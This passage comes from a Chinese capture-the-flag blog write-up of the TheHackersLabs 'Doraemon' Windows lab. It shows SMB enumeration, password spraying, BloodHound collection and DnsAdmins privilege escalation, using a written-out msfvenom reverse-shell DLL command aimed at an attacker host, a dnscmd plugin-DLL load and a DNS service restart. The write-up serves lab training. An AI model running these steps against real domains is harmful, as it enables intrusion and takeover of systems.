192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\: \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo: STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示 \u003ccode\u003eSTATUS_LOGON_FAILURE\u003c/code\u003e 存在用户名，但是密码错了\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eKerberoast ❌\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e再枚举 \u003ccode\u003eKerberoast\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] invalid principal syntax\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没法子，这里看了一下 \u003ccode\u003eWP\u003c/code\u003e，发现 txt 文件中的 \u003ccode\u003eDorayaki1\u003c/code\u003e 是一个有效密码\u003c/p\u003e\n\u003ch3\u003e密码喷洒\u003c/h3\u003e\n\u003cp\u003e我们进行密码喷洒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:Dorayaki1 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo:Dorayaki1 STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到用户 \u003ccode\u003eDoraemon\u003c/code\u003e 的凭据\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           \nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \n\n➜  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e域分析\u003c/h3\u003e\n\u003cp\u003e使用 \u003ccode\u003ebloodhound-ce-python\u003c/code\u003e 进行信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: doraemon.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250803115152_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e域用户组信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eBloodhound\u003c/code\u003e 中没能找到什么可利用信息\u003c/p\u003e\n\u003cp\u003e上 \u003ccode\u003ewinpeas\u003c/code\u003e 能找到一个奇怪的文本文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是一个凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e*Evil-WinRM* PS C:\\\u003e cat 'C:\\Users\\Doraemon\\Links\\Carta de amor a Shizuka.txt'\nShizuka te doy la clave de mi corazon: ShizukaTeAmobb12345\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e密码喷洒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:ShizukaTeAmobb12345 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Suneo:ShizukaTeAmobb12345\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是 \u003ccode\u003esuneo\u003c/code\u003e 的凭据，属于 \u003ccode\u003eDNSADMINS\u003c/code\u003e 和 \u003ccode\u003eDORAYAKI\u003c/code\u003e 组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003eBloodyAD\u003c/code\u003e 查看可写，有很多\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e在 \u003ccode\u003eHackTricks\u003c/code\u003e 中能找到利用方法：\u003ca href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\"\u003ehttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDnsAdmins\u003c/strong\u003e 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 \u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e生成反弹 \u003ccode\u003eshell\u003c/code\u003e DLL\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: OMG.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用以下命令使 \u003ccode\u003eDNS\u003c/code\u003e 服务器加载任意 \u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e*Evil-WinRM* PS C:\\tools\u003e dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\\tools\\OMG.dll\n\nPropiedad del Registro serverlevelplugindll restablecida correctamente.\nComando completado correctamente.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后重启服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003esc.exe \\\\WIN-VRU3GG3DPLJ stop dns\nsc.exe \\\\WIN-VRU3GG3DPLJ start dns\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e 和 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-powershell\"\u003eC:\\Users\\Administrador\\Desktop\u003etype root.txt\ntype root.txt\nadvcrxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Suneo\\Desktop\u003etype user.txt\ntype user.txt\nasfrexxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Administrador\\Desktop\u003ewhoami\nwhoami\nnt authority\\system\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e还行，就一开始的密码没猜到\u003c/p\u003e","title":"TheHackersLabs - Doraemon","date":"2025-08-03","updated":"2025-08-03","tags":["TheHackersLabs","Windows","DNSADmins","SMB","CVE-2021-40469"],"categories":"靶机","comments":true,"description":"Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧..."},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"08","day":"03","id":"TheHackersLabsDoraemon"},"buildId":"EB9TO-uiYYo4SnKeXMjbl","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>